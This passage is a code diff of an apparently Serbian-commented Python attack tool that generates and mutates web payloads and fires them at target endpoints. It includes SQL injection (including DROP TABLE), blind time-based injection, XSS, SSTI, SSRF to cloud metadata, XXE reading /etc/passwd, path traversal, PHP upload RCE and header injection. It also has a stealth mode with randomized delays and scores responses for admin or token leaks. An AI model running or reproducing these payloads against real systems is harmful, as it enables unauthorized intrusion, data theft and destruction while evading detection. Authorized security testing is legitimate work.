+            f"__proto__[test]=<script>alert('XSS')</script>",
+            # SSTI + XSS
+            f"{{7*7}}<script>alert(49)</script>",
         ]
         
-        if not vulnerable_payloads:
-            print("⚠️  Nema vulnerable payload-a za mutaciju iz attack faze")
-            vulnerable_payloads = injection_results[:10]  # Uzmi prvih 10
+        for i, polyglot in enumerate(polyglot_patterns):
+            mutation = payload.copy()
+            mutation["payload"] = polyglot
+            mutation["mutation_type"] = f"polyglot_{i+1}"
+            mutations.append(mutation)
             
-        print(f"🎯 [MUTATE] Mutiranje {len(vulnerable_payloads)} payload-a...")
+        return mutations
         
-        # 4. Generiši mutacije za svaki payload
-        for payload_data in vulnerable_payloads:
-            mutations = self.generate_mutations(payload_data)
-            self.results["generated_payloads"].extend(mutations)
+    def _contextual_mutations(self, payload: Dict) -> List[Dict]:
+        """Kontekstualne mutacije na osnovu endpoint-a i parametara"""
+        mutations = []
+        base_payload = payload.get("payload", "")
+        endpoint = payload.get("endpoint", "")
+        
+        # Analiza konteksta
+        context_indicators = {
+            "login": ["admin'--", "' OR '1'='1'--", "admin' OR '1'='1'#"],
+            "search": ["<script>alert('XSS')</script>", "%' AND SLEEP(5)--", "{{7*7}}"],
+            "upload": ["<?php echo 'RCE'; ?>", "../../../etc/passwd", "../../windows/system32/drivers/etc/hosts"],
+            "api": ['{"__proto__":{"isAdmin":true}}', "'; DROP TABLE users;--", "{{config}}"],
+            "admin": ["../admin", "../../admin/config", "__proto__[isAdmin]=true"]
+        }
+        
+        # Detektuj kontekst na osnovu URL-a
+        detected_context = None
+        for context, payloads in context_indicators.items():
+            if context in endpoint.lower():
+                detected_context = context
+                break
+                
+        if detected_context:
+            for i, contextual_payload in enumerate(context_indicators[detected_context]):
+                mutation = payload.copy()
+                mutation["payload"] = contextual_payload
+                mutation["mutation_type"] = f"contextual_{detected_context}_{i+1}"
+                mutations.append(mutation)
+                
+        return mutations
+        
+    def _blind_mutations(self, payload: Dict) -> List[Dict]:
+        """Blind injection mutacije - time-based i boolean-based"""
+        mutations = []
+        
+        blind_payloads = [
+            # SQL Time-based
+            "'; WAITFOR DELAY '00:00:05'--",
+            "' OR SLEEP(5)--",
+            "'; SELECT pg_sleep(5)--",
+            # Boolean-based SQL
+            "' AND '1'='1",
+            "' AND '1'='2",
+            # NoSQL injection
+            "'; return /.*/.test('') && sleep(5000); var x='",
+            # LDAP injection
+            "*)(uid=*))(|(uid=*",
+            # XPath injection
+            "'] | //user/*[contains(*,'admin') and substring(.,1,1)='a",
+        ]
+        
+        for i, blind_payload in enumerate(blind_payloads):
+            mutation = payload.copy()
+            mutation["payload"] = blind_payload
+            mutation["mutation_type"] = f"blind_{i+1}"
+            mutations.append(mutation)
             
-            # Test deo mutacija
-            tested_mutations = self.test_mutations(mutations, payload_data)
-            self.results["mutation_tests"].extend(tested_mutations)
+        return mutations
+        
+    def _advanced_mutations(self, payload: Dict) -> List[Dict]:
+        """Napredne mutation strategije"""
+        mutations = []
+        base_payload = payload.get("payload", "")
+        
+        advanced_techniques = [
+            # SSTI (Server-Side Template Injection)
+            "{{7*7}}",
+            "${7*7}",
+            "#{7*7}",
+            "<%= 7*7 %>",
+            # SSRF (Server-Side Request Forgery)
+            "http://169.254.169.254/latest/meta-data/",
+            "http://localhost:22",
+            "file:///etc/passwd",
+            # XXE (XML External Entity)
+            "<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
+            # CRLF Injection
+            "%0d%0aSet-Cookie: admin=true",
+            # Host Header Injection
+            "evil.com",
+            # HTTP Response Splitting
+            "%0d%0aContent-Length: 0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 25%0d%0a%0d%0a<script>alert('XSS')</script>"
+        ]
+        
+        for i, advanced_payload in enumerate(advanced_techniques):
+            mutation = payload.copy()
+            mutation["payload"] = advanced_payload
+            mutation["mutation_type"] = f"advanced_{i+1}"
+            mutations.append(mutation)
             
-        # 5. AI evaluacija
-        self.evaluate_mutations()
+        return mutations
         
-        # 6. Generiši sažetak
-        self.generate_mutation_summary()
+    def test_mutations(self, mutations: List[Dict]) -> List[Dict]:
+        """Testira mutacije sa dummy POST zahtevima"""
+        print("🧪 [TEST] Pokretanje testiranja mutacija...")
         
-        # 7. Snimi rezultate
-        self.save_results()
+        tested_mutations = []
         
-        # 8. Prikaži sažetak
-        self.display_mutation_summary()
+        for i, mutation in enumerate(mutations[:100], 1):  # Limit na 100 za brzinu
+            if i % 10 == 0:
+                print(f"🧪 [TEST] Progress: {i}/{min(len(mutations), 100)}")
+                
+            try:
+                # Dummy test request
+                test_result = self._execute_mutation_test(mutation)
+                mutation["test_result"] = test_result
+                tested_mutations.append(mutation)
+                
+                # Intelligent delay
+                if self.meta_config.get('stealth_mode', False):
+                    delay = self.meta_config.get('rate_delay_seconds', 1.0)
+                    time.sleep(delay + random.uniform(0, 0.5))
+                else:
+                    time.sleep(random.uniform(0.1, 0.3))
+                    
+            except Exception as e:
+                mutation["test_result"] = {
+                    "status": "ERROR",
+                    "error": str(e),
+                    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+                }
+                tested_mutations.append(mutation)
+                
+        self.mutation_results["mutation_tests"] = tested_mutations
+        print(f"🧪 [TEST] Testirano {len(tested_mutations)} mutacija")
+        return tested_mutations
+        
+    def _execute_mutation_test(self, mutation: Dict) -> Dict:
+        """Izvršava test mutacije"""
+        endpoint = mutation.get("endpoint", "")
+        method = mutation.get("method", "POST").upper()
 
-def main():
-    mutator = ShadowMutatorCore()
-    mutator.run_mutation()
+        payload = mutation.get("payload", "")
+        if isinstance(payload, dict):
+            payload = json.dumps(payload, separators=(',', ':'))  # Serialize proto
+        params = mutation.get("params", {})
+        headers = mutation.get("headers", {})
+        
+        # Setup session headers
+        session_headers = {**self.session.headers, **headers}
+        if 'User-Agent' not in session_headers:
+            session_headers['User-Agent'] = 'ShadowFox-Mutation/2.0'
+            
+        try:
+            start_time = time.time()
+            
+            # Izvršavanje zahteva
+            if method == "GET":
+                response = self.session.get(endpoint, params={**params, "test": payload}, 
+                                          headers=session_headers, timeout=10)
+            else:
+                data = {**params, "test": payload}
+                response = self.session.post(endpoint, data=data, 
+                                           headers=session_headers, timeout=10)
+                
+            end_time = time.time()
+            
+            test_result = {
+                "payload_sent": payload,
+                "status": "SUCCESS",
+                "status_code": response.status_code,
+                "response_time": round(end_time - start_time, 3),
+                "content_length": len(response.content),
+                "response_headers": dict(response.headers),
+                "response_snippet": response.text[:500] if response.text else "",
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+            }
+            
+            return test_result
+            
+        except Exception as e:
+            return {
+                "status": "FAILED",
+                "error": str(e),
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+            }
+            
+    def ai_evaluate_mutations(self, tested_mutations: List[Dict]) -> List[Dict]:
+        """AI evaluacija mutacija na osnovu response-a"""
+        print("🤖 [AI EVAL] Pokretanje AI evaluacije...")
+        
+        evaluated_mutations = []
+        
+        for mutation in tested_mutations:
+            ai_score = self._calculate_ai_score(mutation)
+            mutation["ai_score"] = ai_score
+            mutation["ai_evaluation"] = self._generate_ai_evaluation(mutation, ai_score)
+            evaluated_mutations.append(mutation)
+            
+        # Sortiraj po AI score
+        evaluated_mutations.sort(key=lambda x: x.get("ai_score", 0), reverse=True)
+        
+        # Izdvoj top payloade
+        threshold = self.meta_config.get('ai_score_threshold', 3.0)
+        
+        self.mutation_results["top_ai_scored_payloads"] = [
+            m for m in evaluated_mutations if m.get("ai_score", 0) >= threshold
+        ][:20]  # Top 20
+        
+        self.mutation_results["high_score_payloads"] = [
+            m for m in evaluated_mutations if m.get("ai_score", 0) >= threshold * 1.5
+        ][:10]  # Top 10 highest
+        
+        print(f"🤖 [AI EVAL] Top payloadi: {len(self.mutation_results['top_ai_scored_payloads'])}")
+        print(f"🔥 [AI EVAL] High score: {len(self.mutation_results['high_score_payloads'])}")
+        
+        return evaluated_mutations
+        
+    def _calculate_ai_score(self, mutation: Dict) -> float:
+        """Kalkuliše AI score na osnovu response karakteristika"""
+        score = 0.0
+        test_result = mutation.get("test_result", {})
+        
+        if test_result.get("status") != "SUCCESS":
+            return 0.0
+            
+        status_code = test_result.get("status_code", 0)
+        response_time = test_result.get("response_time", 0)
+        content_length = test_result.get("content_length", 0)
+        response_snippet = test_result.get("response_snippet", "").lower()
+        
+        # Scoring faktori
+        if status_code == 200:
+            score += self.scoring_factors["HTTP_SUCCESS"]
+        elif status_code in [500, 502, 503]:
+            score += 2  # Error može biti indikator
+            
+        # Content analysis
+        if "admin" in response_snippet:
+            score += self.scoring_factors["ADMIN_REFERENCE"]
+        if "token" in response_snippet:
+            score += self.scoring_factors["TOKEN_REFERENCE"]
+        if "dashboard" in response_snippet:
+            score += self.scoring_factors["DASHBOARD_REFERENCE"]
+        if "unauthorized" not in response_snippet and "forbidden" not in response_snippet:
+            score += self.scoring_factors["NO_UNAUTHORIZED_ERROR"]
+            
+        # Payload reflection check
+        payload = mutation.get("payload", "").lower()
+        if payload and payload in response_snippet:
+            score += self.scoring_factors["REFLECTION_FOUND"]
+            
+        # Error disclosure patterns
+        error_patterns = ["error", "exception", "stack trace", "sql", "mysql", "postgresql"]
+        if any(pattern in response_snippet for pattern in error_patterns):
+            score += self.scoring_factors["ERROR_DISCLOSURE"]
+            
+        # Timing anomaly
+        if response_time > 3.0:
+            score += self.scoring_factors["TIMING_ANOMALY"]
+            
+        # Content length anomaly
+        if content_length > 10000 or content_length < 100:
+            score += 1  # Unusual content length
+            
+        return round(score, 2)
+        
+    def _generate_ai_evaluation(self, mutation: Dict, ai_score: float) -> Dict:
+        """Generiše AI evaluaciju sa objašnjenjem"""
+        test_result = mutation.get("test_result", {})
+        
+        evaluation = {
+            "score": ai_score,
+            "confidence": "HIGH" if ai_score >= 8 else "MEDIUM" if ai_score >= 4 else "LOW",
+            "risk_level": "CRITICAL" if ai_score >= 10 else "HIGH" if ai_score >= 6 else "MEDIUM" if ai_score >= 3 else "LOW",
+            "indicators": [],
+            "recommendation": ""
+        }
+        
+        # Generiši indikatore na osnovu score-a
+        if test_result.get("status_code") == 200:
+            evaluation["indicators"].append("Successful HTTP response")
+        if "admin" in test_result.get("response_snippet", "").lower():
+            evaluation["indicators"].append("Admin reference found")
+        if mutation.get("payload", "").lower() in test_result.get("response_snippet", "").lower():
+            evaluation["indicators"].append("Payload reflection detected")
+            
+        # Generiši preporuku
+        if ai_score >= 8:
+            evaluation["recommendation"] = "IMMEDIATE MANUAL REVIEW - High vulnerability potential"
+        elif ai_score >= 4:
+            evaluation["recommendation"] = "Manual review recommended - Interesting response patterns"
+        else:
+            evaluation["recommendation"] = "Low priority - Standard response"
+            
+        return evaluation
+        
+    def generate_statistics(self):
+        """Generiše statistike mutation operacije"""
+        all_mutations = self.mutation_results.get("mutation_tests", [])
+        top_payloads = self.mutation_results.get("top_ai_scored_payloads", [])
+        high_score = self.mutation_results.get("high_score_payloads", [])
+        
+        stats = {
+            "total_mutations_generated": len(all_mutations),
+            "successful_tests": len([m for m in all_mutations if m.get("test_result", {}).get("status") == "SUCCESS"]),
+            "failed_tests": len([m for m in all_mutations if m.get("test_result", {}).get("status") != "SUCCESS"]),
+            "top_scored_payloads": len(top_payloads),
+            "high_score_payloads": len(high_score),
+            "average_ai_score": round(sum(m.get("ai_score", 0) for m in all_mutations) / len(all_mutations), 2) if all_mutations else 0,
+            "max_ai_score": max((m.get("ai_score", 0) for m in all_mutations), default=0),
+            "success_rate": round((len([m for m in all_mutations if m.get("test_result", {}).get("status") == "SUCCESS"]) / len(all_mutations)) * 100, 2) if all_mutations else 0,
+            "mutation_strategies_used": list(self.mutation_strategies.keys()),
+            "scan_timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
+        }
+        
+        # Top mutation strategije po AI score
+        strategy_scores = {}
+        for mutation in all_mutations:
+            strategy = mutation.get("mutation_strategy", "unknown")
+            score = mutation.get("ai_score", 0)
+            if strategy not in strategy_scores:
+                strategy_scores[strategy] = []
+            strategy_scores[strategy].append(score)
+            
+        top_strategies = {}
+        for strategy, scores in strategy_scores.items():
+            if scores:
+                top_strategies[strategy] = {
+                    "average_score": round(sum(scores) / len(scores), 2),
+                    "max_score": max(scores),
+                    "count": len(scores)
+                }
+                
+        stats["strategy_performance"] = dict(sorted(top_strategies.items(), 
+                                                  key=lambda x: x[1]["average_score"], 
+                                                  reverse=True))
+        
+        self.mutation_results["mutation_statistics"] = stats
+        
+    def save_results(self):
+        """Snima rezultate u mutator_core.json"""
+        output_file = "Centar/mutator_core.json"
+
+        try:
+            with open(output_file, 'w') as f:
+                json.dump(self.mutation_results, f, indent=2)
+            print(f"💾 [SAVE] Mutacija rezultati snimljeni: {output_file}")
+        except Exception as e:
+            print(f"❌ [ERROR] Nije moguće sačuvati rezultate: {str(e)}")
 
 if __name__ == "__main__":
-    main()
+    core = MutationCore()
+    core.load_meta_config()
+    core.load_source_payloads()
+    mutations = core.generate_mutations()
+    tested = core.test_mutations(mutations)
+    evaluated = core.ai_evaluate_mutations(tested)
+    core.generate_statistics()
+    core.save_results()
